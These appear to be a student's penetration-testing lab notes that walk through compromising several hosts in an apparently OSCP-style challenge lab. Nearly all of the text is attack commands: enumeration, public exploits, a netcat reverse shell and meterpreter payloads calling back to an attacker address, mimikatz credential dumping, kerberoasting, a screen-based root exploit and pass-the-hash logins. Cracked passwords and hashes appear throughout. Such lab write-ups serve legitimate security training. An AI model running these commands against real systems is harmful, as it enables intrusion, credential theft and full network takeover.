initial enumeration
- -A: Enable OS detection, version detection, script scanning, and traceroute
- -sT: connect scan
```
nmap -sT -A -oN nmap-lab1 192.168.193.141 192.168.193.143-145
```

.141
```
gobuster dir -u http://192.168.193.141 -w /usr/share/wordlists/dirb/big.txt
gobuster dir -u http://192.168.193.141 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jpg,jpeg,pdf,lnk,conf,zip
# find admin page on 181

# determined that the admin username field was vulnerable to sqli, but could not manually do SQL injection
# Look up Attendance and Payroll system on exploit-db find and modify https://www.exploit-db.com/exploits/50801 to use the correct paths and get a shell, also modify shell body to be /home/kali/relia/shell.php

python3 50801.py http://192.168.225.141:81
nc -nvlp 1234

Get-Childitem –Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem -recurse -filter "local.txt" -ErrorAction SilentlyContinue
```

.141 privesc
```
iwr -uri http://192.168.45.219:8000/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe

# writable
C:\wamp64\bin\apache\apache2.4.51\bin\httpd.exe
c:\wamp64\bin\mariadb\mariadb10.6.5\bin\mysqld.exe
c:\wamp64\bin\mysql\mysql5.7.36\bin\mysqld.exe

# write perms on
c:\wamp64

# mary.williams hash
Mary.Williams::MS01:1122334455667788:1658020ce90cc357879f186905dabc89:0101000000000000d9d435765b25da01361df5c7c2071a3a00000000080030003000000000000000000000000030000093126ea9f314e0e1b58a6af629f6420f919a633c583c5a70fae7a07bb7099da60a00100000000000000000000000000000000000090000000000000000000000 

# can't crack it
hashcat -m 1000 mw.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# ssh file
C:\Users\All Users\ssh\ssh_host_rsa_key.pub

# using EFS potato we can get a root shell on 9999
iwr -uri http://192.168.45.219/efspotato.cs -Outfile efspotato.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe efspotato.cs
iwr -uri http://192.168.45.219/nc.exe -Outfile nc.exe

.\efspotato.exe "nc.exe 192.168.45.219 9999 -e cmd"
```
.141 post exploitation
```
iwr -uri http://192.168.45.219/mimikatz.exe -Outfile mimikatz.exe
. .\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::cache 
token::elevate
lsadump::sam

# got mary.williams hash 
# got celia.almeda hash - e728ecbadfb02f51ce8eed753f3ff3fd
# support hash - d9358122015c5b159574a88b3c0d2071 - cracked: Freedom1
# Administrator hash - 3c4495bbd678fac8c9d218be4f2bbc7b - cracked: December31 

# get domain info
iwr -uri http://192.168.45.219/SharpHound.ps1 -Outfile SharpHound.ps1
powershell -ep bypass
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All

impacket-smbserver -smb2support smb smb 

net use \\192.168.45.219\smb
copy 20231205092228_BloodHound.zip \\192.168.45.219\smb
bloodhound

iwr -uri http://192.168.45.219/Rubeus.exe -Outfile Rubeus.exe
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
copy hashes.kerberoast \\192.168.45.219\smb

# got a couple kerberoastable users

sudo ip route add 10.10.84.0/24 dev ligolo
iwr -uri http://192.168.45.219/agent.exe -Outfile agent.exe
./agent.exe -ignore-cert -connect 192.168.45.219:11601
```

.143
```
nmap 192.168.193.143
# open ports: 21,22,80,81,443,3000,3003,3306,5432

nmap -sT -A -Pn -p 80,81 192.168.193.143
nmap -sT -A -Pn -p 21,22 192.168.193.143

gobuster dir -u http://192.168.193.143 -w /usr/share/wordlists/dirb/big.txt
gobuster dir -u http://192.168.193.143:81 -w /usr/share/wordlists/dirb/big.txt
# try feroxbuster
feroxbuster --url http://192.168.193.143
feroxbuster --url http://192.168.193.143/api

gobuster dir -u http://192.168.193.143:81 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jpg,jpeg,pdf,lnk,conf

whatweb 192.168.193.143
whatweb 192.168.193.143:81
sudo nmap -O 192.168.193.143 --osscan-guess

# mysql, ftp and postgres don't work
ftp support@192.168.193.143
mysql -u support -p 'Freedom1' -h 192.168.193.143 -P 3306
psql -h 192.168.193.143 -p 5432 -d postgres -U support

# findings:
- has pico CMS
- from /api/heartbeat we find that aerospike is running
- https://www.exploit-db.com/exploits/49067

searchsploit -m 49067
https://github.com/b4ny4n/CVE-2020-13151
python3 cve2020-13151.py --ahost 192.168.193.143 --lhost 192.168.45.219 --lport 80 --netcatshell
# note, many ports may be blocked so use one that's open such as 80 if shell not working

https://github.com/DominicBreuker/pspy
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
```

.143 privesc
```
# find screen unusual binary from linpeas
https://www.exploit-db.com/exploits/41154
https://0xdf.gitlab.io/2020/09/10/htb-haircut.html
https://github.com/X0RW3LL/XenSpawn

# create exploit files and copy to container root 
cd /home/kali/lab1
cp rootshell.c /var/lib/machines/xen-test/root/
cp libhax.c /var/lib/machines/xen-test/root/

cd /var/lib/machines/xen-test/root
sudo systemd-nspawn -M xen-test

# compile exploit in container
gcc -fPIC -shared -ldl -o libhax.so libhax.c
gcc -o rootshell rootshell.c

# copy back to lab folder
cp libhax.so /home/kali/lab1/
cp rootshell /home/kali/lab1/

# download files to target
cd /tmp
wget http://192.168.45.219/libhax.so
wget http://192.168.45.219/rootshell

# run exploit
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
cat ld.so.preload
screen -ls
/tmp/rootshell # this gets us the root shell
```

.144
```
nmap 192.168.193.144
nmap -sT -A -Pn -p 80 192.168.193.144
gobuster dir -u http://192.168.193.144 -w /usr/share/wordlists/dirb/big.txt

# find that it is running joomla CMS
# also find a git repo that includes a security update
joomscan -u http://192.168.193.144
# joomscan for me does not return anything

# use gitdumper to gain creds from the git logs
https://github.com/arthaud/git-dumper/blob/master/git_dumper.py
python3 git_dumper.py http://192.168.193.144 /home/kali/lab1/test
git show # reveal password
# username: stuart@challenge.lab
# password: BreakingBad92
ftp stuart@192.168.193.144

# only the 3rd backup file can be read
zip2john sitebackup3.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
# show passwords and unzip using password
john --show zip.hash
unzip -P codeblue sitebackup3.zip
# there is an issue with unzipping so use another tool
7z -pcodeblue x sitebackup3.zip 
# check out configuration.php in the joomla output directory
# obtain some creds
user: joomla, password: Password@1
secret: Ee24zIK4cDhJHL4H
another user: chloe

# ssh as stuart and use secret 
su chloe # enter password
sudo -l
sudo su
```

.145
```
nmap 192.168.225.145
nmap -sT -A -Pn -p 80 192.168.225.145
sudo nmap -sV -p 80 --script "vuln" 192.168.225.145
gobuster dir -u http://192.168.225.145 -w /usr/share/wordlists/dirb/big.txt
gobuster dir -u http://192.168.225.145 -w /usr/share/wordlists/dirb/common.txt

# port 1978 unisql is open
nikto -h 192.168.225.145

wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.225.145/FUZZ
ffuf -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','xml','.log' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://192.168.225.145/FUZZ
gobuster dir -u http://192.168.225.145 -w /usr/share/wordlists/dirb/common.txt -x txt,pdf,config

# anonymous mode on, can't do anything
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.225.145

# port 161 snmp is open
sudo nmap -sU 192.168.225.145

# did not work
crackmapexec smb 192.168.225.141 -u Administrator -p 'December31' --continue-on-success
crackmapexec smb 192.168.225.145 -u support -p 'Freedom1' --continue-on-success
crowbar -b rdp -s 192.168.225.145/32 -u Administrator -C passwords.txt -n 1

# try pass the hash
impacket-psexec -hashes :e728ecbadfb02f51ce8eed753f3ff3fd celia.almeda@192.168.225.145
impacket-psexec -hashes :9a3121977ee93af56ebd0ef4f527a35e mary.williams@192.168.225.145
impacket-wmiexec -hashes :9a3121977ee93af56ebd0ef4f527a35e mary.williams@192.168.225.141

# try 1978 unisql 
# google for unisql exploit - find https://www.exploit-db.com/exploits/49601

sudo msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.45.219
set LPORT 4444
set ExitOnSession false
run -j

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.219 LPORT=4444 -f exe -o met.exe

python2 49601.py 192.168.225.145 192.168.45.218 met.exe
```

.145 privesc
```
iwr -uri http://192.168.45.219/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe

# find zachary is an admin
# we can write to C:\Users\Public
C:\"Program Files (x86)"\"Mouse Server"\Mouse Server Luminati.exe
type C:\Users\offsec\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
"&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"

-pw 'Th3R@tC@tch3r' zachary@127.0.0.1
# password works
crackmapexec smb 192.168.225.145 -u zachary -p 'Th3R@tC@tch3r' --continue-on-success

# connecting via smb or winrm fail
crackmapexec 192.168.225.145 -u zachary -p 'Th3R@tC@tch3r' -X whoami
crackmapexec winrm 192.168.225.145 -u zachary -p 'Th3R@tC@tch3r' --continue-on-success

# rdp should work based on success of this command
crowbar -b rdp -s 192.168.225.145/32 -u zachary -C zachary-pass -n 1
xfreerdp /cert-ignore /u:zachary /p:'Th3R@tC@tch3r' /v:192.168.225.145

zachery - BrokenPolarizedCattle963
crackmapexec winrm 192.168.225.145 -u zachery -p 'BrokenPolarizedCattle963' --continue-on-success

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.219 LPORT=9999 -f exe -o shell.exe
nc -nvlp 9999
iwr -uri http://192.168.45.219/shell.exe -Outfile shell.exe

- [ ] # NOTE that I need none of this, i just needed to run cmd as administrator to get the flag in Administrator's Desktop
# mouseserver is not a service, but a process
Get-Process
Get-CimInstance -ClassName win32_service | Select Name,State,PathName

# verify that we see activity
iwr -uri http://192.168.45.219/Watch-Command.ps1 -Outfile Watch-Command.ps1
Import-Module C:\Users\zachary\Watch-Command.ps1
Get-Process "MouseServer" -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 30

x86_64-w64-mingw32-gcc adduser.c -o /home/kali/lab1/adduser.exe
cd C:\"Program Files (x86)"\"Mouse Server"
iwr -uri http://192.168.45.219/adduser.exe -Outfile MouseServer.exe
```

.142
```
evil-winrm -i 10.10.84.142 -u celia.almeda -H "e728ecbadfb02f51ce8eed753f3ff3fd"

# on this box there's a firewall preventing any file downloads
# look around in directories and find windows.old a SAM file
download C:\windows.old\Windows\System32\SAM
download C:\windows.old\Windows\System32\SYSTEM

pypykatz registry --sam SAM SYSTEM

# tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
# the has we want to crack is the second one - 4979d69d4ca66955c075c41cf45f24dc
# 1000 = NTLM hash
hashcat -m 1000 tomadmin.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

.140
```
nmap 10.10.84.140

# well pass the hash with tom_admin was easy!
impacket-psexec -hashes :4979d69d4ca66955c075c41cf45f24dc tom_admin@10.10.84.140
```